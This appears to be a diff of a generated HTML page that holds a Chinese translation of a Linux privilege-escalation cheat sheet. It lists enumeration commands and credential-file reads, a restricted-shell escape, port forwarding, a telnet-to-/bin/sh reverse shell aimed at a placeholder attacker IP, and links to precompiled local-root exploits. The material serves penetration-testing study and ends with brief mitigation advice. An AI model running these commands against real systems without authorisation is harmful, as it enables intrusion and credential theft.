@@ -131,10 +131,10 @@
               <p>原文链接：<a target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
 <h1 id="基本Linux权限提升"><a href="#基本Linux权限提升" class="headerlink" title="基本Linux权限提升"></a>基本Linux权限提升</h1><h4 id="枚举是关键。"><a href="#枚举是关键。" class="headerlink" title="枚举是关键。"></a>枚举是关键。</h4><p>（Linux）权限升级就是：</p>
 <ul>
-<li>收集 - *<strong>枚举</strong>，更多枚举和更多枚举。*</li>
+<li>收集 - <em><strong>枚举</strong>，更多枚举和更多枚举。</em></li>
 <li>流程 - <em>对数据<strong>进行</strong>排序，<strong>分析</strong>和确定优先级。</em></li>
 <li>搜索 - <em>了解要搜索的内容以及在何处<strong>查找</strong>漏洞利用代码。</em></li>
-<li>适应 - *<strong>自定义</strong>漏洞利用，因此适合。并非每个漏洞利用都适用于每个系统“开箱即用”。*</li>
+<li>适应 - <em><strong>自定义</strong>漏洞利用，因此适合。并非每个漏洞利用都适用于每个系统“开箱即用”。</em></li>
 <li>尝试 - <em>为（大量）<strong>试验和错误</strong>做好准备。</em></li>
 </ul>
 <h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h4 id="什么是分销类型？什么版本？"><a href="#什么是分销类型？什么版本？" class="headerlink" title="什么是分销类型？什么版本？"></a>什么是分销类型？什么版本？</h4><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;issue 
@@ -216,7 +216,7 @@ cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root<span aria-hidden="tru
 
 
 
-<h4 id="任何纯文本用户名和-或密码？"><a href="#任何纯文本用户名和-或密码？" class="headerlink" title="任何纯文本用户名和/或密码？"></a>任何纯文本用户名和/或密码？</h4><pre class="line-numbers language-none"><code class="language-none">grep -i user [filename] 
+<h4 id="任何纯文本用户名和-x2F-或密码？"><a href="#任何纯文本用户名和-x2F-或密码？" class="headerlink" title="任何纯文本用户名和&#x2F;或密码？"></a>任何纯文本用户名和&#x2F;或密码？</h4><pre class="line-numbers language-none"><code class="language-none">grep -i user [filename] 
 grep -i pass [filename] 
 grep -C 5 &quot;password&quot; [filename] 
 find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
@@ -251,7 +251,7 @@ w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><s
 
 
 
-<h4 id="什么缓存？IP和-或MAC地址"><a href="#什么缓存？IP和-或MAC地址" class="headerlink" title="什么缓存？IP和/或MAC地址"></a>什么缓存？IP和/或MAC地址</h4><pre class="line-numbers language-none"><code class="language-none">arp -e 
+<h4 id="什么缓存？IP和-x2F-或MAC地址"><a href="#什么缓存？IP和-x2F-或MAC地址" class="headerlink" title="什么缓存？IP和&#x2F;或MAC地址"></a>什么缓存？IP和&#x2F;或MAC地址</h4><pre class="line-numbers language-none"><code class="language-none">arp -e 
 route 
 &#x2F;sbin&#x2F;route -nee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
@@ -264,15 +264,15 @@ route
 nc -lvp 4445    # Attacker. Ouput (Results) 
 telnet [atackers ip] 44444 | &#x2F;bin&#x2F;sh | [local ip] 44445    # On the targets system. Use the attackers IP! &#96;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>注意：http：//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</p>
-<h4 id="端口转发可能吗？重定向并与来自其他视图的流量进行交互"><a href="#端口转发可能吗？重定向并与来自其他视图的流量进行交互" class="headerlink" title="端口转发可能吗？重定向并与来自其他视图的流量进行交互"></a>端口转发可能吗？<em>重定向并与来自其他视图的流量进行交互</em></h4><p>注意：http：//<a target="_blank" rel="noopener" href="http://www.boutell.com/rinetd/">www.boutell.com/rinetd/</a></p>
-<p>注意：http：//<a target="_blank" rel="noopener" href="http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch">www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch</a></p>
-<p>注意：http：//downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip</p>
+<p>注意：http：&#x2F;&#x2F;lanmaster53.com&#x2F;2011&#x2F;05&#x2F;7-linux-shells-using-built-in-tools&#x2F;</p>
+<h4 id="端口转发可能吗？重定向并与来自其他视图的流量进行交互"><a href="#端口转发可能吗？重定向并与来自其他视图的流量进行交互" class="headerlink" title="端口转发可能吗？重定向并与来自其他视图的流量进行交互"></a>端口转发可能吗？<em>重定向并与来自其他视图的流量进行交互</em></h4><p>注意：http：&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.boutell.com/rinetd/">www.boutell.com/rinetd/</a></p>
+<p>注意：http：&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch">www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch</a></p>
+<p>注意：http：&#x2F;&#x2F;downloadcenter.mcafee.com&#x2F;products&#x2F;tools&#x2F;foundstone&#x2F;fpipe2_1.zip</p>
 <p>注意：FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP]</p>
 <pre class="line-numbers language-none"><code class="language-none">FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>注意：ssh - [L / R] [本地端口]：[远程ip]：[远程端口] [本地用户] @ [本地ip]</p>
+<p>注意：ssh - [L &#x2F; R] [本地端口]：[远程ip]：[远程端口] [本地用户] @ [本地ip]</p>
 <pre class="line-numbers language-none"><code class="language-none">ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port 
 ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -360,7 +360,7 @@ cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_key &#96;
 
 
 
-<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h4 id="哪些配置文件可以写在-etc-中？能够重新配置服务吗？"><a href="#哪些配置文件可以写在-etc-中？能够重新配置服务吗？" class="headerlink" title="哪些配置文件可以写在/ etc /中？能够重新配置服务吗？"></a>哪些配置文件可以写在/ etc /中？<em>能够重新配置服务吗？</em></h4><pre class="line-numbers language-none"><code class="language-none">ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^.*w.*&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null     # Anyone 
+<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h4 id="哪些配置文件可以写在-x2F-etc-x2F-中？能够重新配置服务吗？"><a href="#哪些配置文件可以写在-x2F-etc-x2F-中？能够重新配置服务吗？" class="headerlink" title="哪些配置文件可以写在&#x2F; etc &#x2F;中？能够重新配置服务吗？"></a>哪些配置文件可以写在&#x2F; etc &#x2F;中？<em>能够重新配置服务吗？</em></h4><pre class="line-numbers language-none"><code class="language-none">ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^.*w.*&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null     # Anyone 
 ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^..w&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null       # Owner 
 ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^.....w&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null    # Group 
 ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;w.$&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null        # Other  
@@ -368,7 +368,7 @@ find &#x2F;etc&#x2F; -readable -type f 2&gt;&#x2F;dev&#x2F;null               # 
 find &#x2F;etc&#x2F; -readable -type f -maxdepth 1 2&gt;&#x2F;dev&#x2F;null   # Anyone &#96;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="在-var-中可以找到什么？"><a href="#在-var-中可以找到什么？" class="headerlink" title="在/ var /中可以找到什么？"></a>在/ var /中可以找到什么？</h4><pre class="line-numbers language-none"><code class="language-none">ls -alh &#x2F;var&#x2F;log 
+<h4 id="在-x2F-var-x2F-中可以找到什么？"><a href="#在-x2F-var-x2F-中可以找到什么？" class="headerlink" title="在&#x2F; var &#x2F;中可以找到什么？"></a>在&#x2F; var &#x2F;中可以找到什么？</h4><pre class="line-numbers language-none"><code class="language-none">ls -alh &#x2F;var&#x2F;log 
 ls -alh &#x2F;var&#x2F;mail 
 ls -alh &#x2F;var&#x2F;spool 
 ls -alh &#x2F;var&#x2F;spool&#x2F;lpd 
@@ -377,7 +377,7 @@ ls -alh &#x2F;var&#x2F;lib&#x2F;mysql
 cat &#x2F;var&#x2F;lib&#x2F;dhcp3&#x2F;dhclient.leases
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="网站上的任何设置-文件（隐藏）？有数据库信息的任何设置文件？"><a href="#网站上的任何设置-文件（隐藏）？有数据库信息的任何设置文件？" class="headerlink" title="网站上的任何设置/文件（隐藏）？有数据库信息的任何设置文件？"></a>网站上的任何设置/文件（隐藏）？<em>有数据库信息的任何设置文件？</em></h4><pre class="line-numbers language-none"><code class="language-none">ls -alhR &#x2F;var&#x2F;www&#x2F; 
+<h4 id="网站上的任何设置-x2F-文件（隐藏）？有数据库信息的任何设置文件？"><a href="#网站上的任何设置-x2F-文件（隐藏）？有数据库信息的任何设置文件？" class="headerlink" title="网站上的任何设置&#x2F;文件（隐藏）？有数据库信息的任何设置文件？"></a>网站上的任何设置&#x2F;文件（隐藏）？<em>有数据库信息的任何设置文件？</em></h4><pre class="line-numbers language-none"><code class="language-none">ls -alhR &#x2F;var&#x2F;www&#x2F; 
 ls -alhR &#x2F;srv&#x2F;www&#x2F;htdocs&#x2F; 
 ls -alhR &#x2F;usr&#x2F;local&#x2F;www&#x2F;apache22&#x2F;data&#x2F; 
 ls -alhR &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F; 
@@ -426,7 +426,7 @@ ls -alh &#x2F;var&#x2F;log&#x2F;samba&#x2F;
 Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp &#96;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>注：http：//<a target="_blank" rel="noopener" href="http://www.thegeekstuff.com/2011/08/linux-var-log-files/">www.thegeekstuff.com/2011/08/linux-var-log-files/</a></p>
+<p>注：http：&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.thegeekstuff.com/2011/08/linux-var-log-files/">www.thegeekstuff.com/2011/08/linux-var-log-files/</a></p>
 <h4 id="如果命令有限，你会打破“监狱”外壳？"><a href="#如果命令有限，你会打破“监狱”外壳？" class="headerlink" title="如果命令有限，你会打破“监狱”外壳？"></a>如果命令有限，你会打破“监狱”外壳？</h4><pre class="line-numbers language-none"><code class="language-none">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; echo os.system(&#39;&#x2F;bin&#x2F;bash&#39;) &#x2F;bin&#x2F;sh -i
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -447,7 +447,7 @@ for i in &#96;locate -r &quot;bin$&quot;&#96;; do find $i \( -perm -4000 -o -per
 find &#x2F; -perm -g&#x3D;s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="哪里可以写入和执行？一些常见的地方：-tmp，-var-tmp，-dev-shm"><a href="#哪里可以写入和执行？一些常见的地方：-tmp，-var-tmp，-dev-shm" class="headerlink" title="哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shm"></a>哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shm</h4><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null      # world-writeable folders 
+<h4 id="哪里可以写入和执行？一些常见的地方：-x2F-tmp，-x2F-var-x2F-tmp，-x2F-dev-x2F-shm"><a href="#哪里可以写入和执行？一些常见的地方：-x2F-tmp，-x2F-var-x2F-tmp，-x2F-dev-x2F-shm" class="headerlink" title="哪里可以写入和执行？一些常见的地方：&#x2F; tmp，&#x2F; var &#x2F; tmp，&#x2F; dev &#x2F; shm"></a>哪里可以写入和执行？一些常见的地方：&#x2F; tmp，&#x2F; var &#x2F; tmp，&#x2F; dev &#x2F; shm</h4><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null      # world-writeable folders 
 find &#x2F; -perm -222 -type d 2&gt;&#x2F;dev&#x2F;null     # world-writeable folders 
 find &#x2F; -perm -o w -type d 2&gt;&#x2F;dev&#x2F;null     # world-writeable folders  
 find &#x2F; -perm -o x -type d 2&gt;&#x2F;dev&#x2F;null     # world-executable folders  
@@ -459,7 +459,7 @@ find &#x2F; \( -perm -o w -perm -o x \) -type d 2&gt;&#x2F;dev&#x2F;null   # wor
 
 
 
-<h2 id="准备和寻找利用代码"><a href="#准备和寻找利用代码" class="headerlink" title="准备和寻找利用代码"></a>准备和寻找利用代码</h2><h4 id="安装-支持哪些开发工具-语言？"><a href="#安装-支持哪些开发工具-语言？" class="headerlink" title="安装/支持哪些开发工具/语言？"></a>安装/支持哪些开发工具/语言？</h4><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name perl* 
+<h2 id="准备和寻找利用代码"><a href="#准备和寻找利用代码" class="headerlink" title="准备和寻找利用代码"></a>准备和寻找利用代码</h2><h4 id="安装-x2F-支持哪些开发工具-x2F-语言？"><a href="#安装-x2F-支持哪些开发工具-x2F-语言？" class="headerlink" title="安装&#x2F;支持哪些开发工具&#x2F;语言？"></a>安装&#x2F;支持哪些开发工具&#x2F;语言？</h4><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name perl* 
 find &#x2F; -name python*  
 find &#x2F; -name gcc* 
 find &#x2F; -name cc
@@ -494,7 +494,7 @@ http:&#x2F;&#x2F;www.vulnview.com&#x2F;cve-details.php?cvename&#x3D;[CVE]
 
 <h4 id="（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担"><a href="#（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担" class="headerlink" title="（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担"></a>（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担</h4><p><a target="_blank" rel="noopener" href="http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/">http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/</a></p>
 <p><a target="_blank" rel="noopener" href="http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/">http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/</a></p>
-<h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><h4 id="上述任何信息都很容易找到吗？"><a href="#上述任何信息都很容易找到吗？" class="headerlink" title="上述任何信息都很容易找到吗？"></a>上述任何信息都很容易找到吗？</h4><p>试试吧！设置一个自动执行脚本和/或第三方产品的cron作业</p>
+<h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><h4 id="上述任何信息都很容易找到吗？"><a href="#上述任何信息都很容易找到吗？" class="headerlink" title="上述任何信息都很容易找到吗？"></a>上述任何信息都很容易找到吗？</h4><p>试试吧！设置一个自动执行脚本和&#x2F;或第三方产品的cron作业</p>
 <h4 id="系统是否完全打补丁？"><a href="#系统是否完全打补丁？" class="headerlink" title="系统是否完全打补丁？"></a>系统是否完全打补丁？</h4><p>内核，操作系统，所有应用程序，插件和Web服务</p>
 <pre class="line-numbers language-none"><code class="language-none">apt-get update &amp;&amp; apt-get upgrade yum update
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
